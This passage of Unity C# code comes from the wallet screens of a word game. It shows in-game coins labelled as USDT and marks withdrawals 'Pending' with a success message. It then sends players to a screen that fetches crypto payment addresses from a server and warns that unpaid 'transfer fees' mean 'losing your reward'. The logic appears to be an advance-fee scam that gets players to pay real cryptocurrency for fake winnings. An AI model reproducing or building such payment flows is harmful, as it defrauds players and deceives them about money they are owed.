        PlayerPrefs.SetString("Pay_Address" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), Address_Text.text);
            WordNexus_GameController.Instance.SpendCoins(picoin_decrise);
        Coin_Amount.text = WordNexus_GameController.Instance.Coins + " USDT";
        PlayerPrefs.SetString("FinalStatusTransactionFee_" + PlayerPrefs.GetInt("TransactionIDTransactionFee", 0), "Pending");


        NewNotificationManager.Instance.SendFailTransactionNotification(float.Parse(AdManager.Instance.transactionMinuteForTransferFeesFlow));


        PlayerPrefs.SetInt("TransactionIDTransactionFee", PlayerPrefs.GetInt("TransactionIDTransactionFee", 0) + 1);

        CheckTransaction();
        Toast.SuccessShow(
            "Your request to send " + (piCoin / float.Parse(AdManager.Instance.WalletCoinConvertValue)).ToString("f2") +
            " coins has been successful. A confirmation message will be sent shortly.", 4);
    }
    public void Back_Btn_Selecte_Network_Screen_Second_Time()
    {
        Secondtime_Open_Screen = false;
        Select_Network_Screen.SetActive(false);
        Main_Wallet_Screen.SetActive(true);
    }
    public void open_Network_Screen_Second_Time()
    {
        Secondtime_Open_Screen = true;
        Select_Network_screen_BackBtn.onClick.RemoveAllListeners();
        Select_Network_screen_BackBtn.onClick.AddListener(() => Back_Btn_Selecte_Network_Screen_Second_Time());
        Select_Network_Screen.SetActive(true);
        Lock_Screen.SetActive(false);
        History_Screen.SetActive(false);
        Select_Network_Screen.SetActive(false);
        Tranfer_Details_Wallet_Screen.SetActive(false);
        Send_Wallet_Screen.SetActive(false);
        Receive_Screen.SetActive(false);
        Select_Network_Screen.SetActive(true);

        Note_text.text = "Don't worry, it's the cryptocurrency block chain portion. you will be required to pay " + Network_Fee_Text_History.text +
            " USDT for this transaction for channel fees, which will also be included to your withdrawal.";
        for (int i = 0; i < PrefabHolder.transform.childCount; i++)
        {
            Destroy(PrefabHolder.transform.GetChild(i).gameObject);
        }
        Debug.Log(GetData.instance.data1.data.Count + " network lenth");
        for (int i = 0; i < GetData.instance.data1.data.Count; i++)
        {
            GameObject a = Instantiate(NetworkPrefab, PrefabHolder.transform);
            Debug.Log(a + " i");
            if (AdManager.Instance.isTransferFeesFix.ToLower() == "true")
            {
                a.GetComponent<WordNexus_NetworkManager>().Assign_Data(GetData.instance.data1.data[i].type, AdManager.Instance.transactionMinuteForTransferFeesFlow,
                Network_Fee_Text_History.text);
            }
            else
            {
                a.GetComponent<WordNexus_NetworkManager>().Assign_Data(GetData.instance.data1.data[i].type, AdManager.Instance.transactionMinuteForTransferFeesFlow,
                Network_Fee_Text_History.text);
            }
        }

    }
    public void OpenPay_Screen_Secondtime()
    {
        AdManager.Instance.WebviewOpen = true;
        Secondtime_Open_Screen = true;
        Lock_Screen.SetActive(false);
        History_Screen.SetActive(false);
        Select_Network_Screen.SetActive(false);
        Tranfer_Details_Wallet_Screen.SetActive(false);
        Send_Wallet_Screen.SetActive(false);
        Receive_Screen.SetActive(false);
        Pay_Fee_Screen.SetActive(true);
        Display_Image_Object.SetActive(false);
        RequireImage_Object.SetActive(true);
        sendScrollRect.verticalNormalizedPosition = 1;

        email_Input.text = PlayerPrefs.GetString("EmailID_" + ID);
        Confirm_text_Box.text = "Confirm if You Pay Fees <color=\"red\"><size=120%>" + Network_Fee_Object_text.text + " USDT</size=120%></color=\"red\"> For " + Asset_Object_text.text + " network.";

        PayFee_screen_PayBtn.onClick.RemoveAllListeners();
        PayFee_screen_PayBtn.onClick.AddListener(() => UpdateData());
        PayFee_screen_BackBtn.onClick.RemoveAllListeners();
        PayFee_screen_BackBtn.onClick.AddListener(() => back_PayScreen());

        Note_Text_Pay_Screen.text = "For your crypto withdrawal, you need to pay transfer fees for this channel. Please ensure to handle this specific fee to" +
            " facilitate a smooth withdrawal process. If not paid, you may not be eligible for withdrawal and losing your reward. Once you paid, we'll process your" +
            " withdrawal within " + AdManager.Instance.transactionMinuteForTransferFeesFlow + " Minutes of receiving payment.";
        for (int i = 0; i < GetData.instance.data1.data.Count; i++)
        {
            if (Asset_Object_text.text == GetData.instance.data1.data[i].type)
            {
                StartCoroutine(GetImage(GetData.instance.data1.data[i].image, GetData.instance.data1.data[i].address));
                break;
            }
        }

    }
    void back_PayScreen()
    {
        AdManager.Instance.WebviewOpen = false;
        Tranfer_Details_Wallet_Screen.SetActive(true);
        confirm_Toggle.isOn = false;
        PayFee_screen_PayBtn.gameObject.SetActive(false);
        Pay_Fee_Screen.SetActive(false);
    }
    IEnumerator GetImage(string image, string Address)
    {
        WWW data = new WWW(image);
        yield return data;

        Texture2D texture2D = data.texture;
        QRImage.texture = texture2D;
        Address_Text.text = Address + "<sprite name=\"copy\">";
    }

    public void networkFeeInfo_open()
    {
        NetworFeeInfoPopup.SetActive(true);
        InfoMessage_text.text = AdManager.Instance.Network_Fee_Information_message;
    }
    public void networkFeeInfo_Close()
    {
        NetworFeeInfoPopup.SetActive(false);
    }

    public void Buy_Swap_Screen_Open()
    {
        Buy_Swap_Screen.SetActive(true);
        Buy_Sell_Message.text = AdManager.Instance.Buy_Sell_Screen_Message;
    }
    public void Buy_Swap_Screen_Close()
    {
        Buy_Swap_Screen.SetActive(false);
    }
}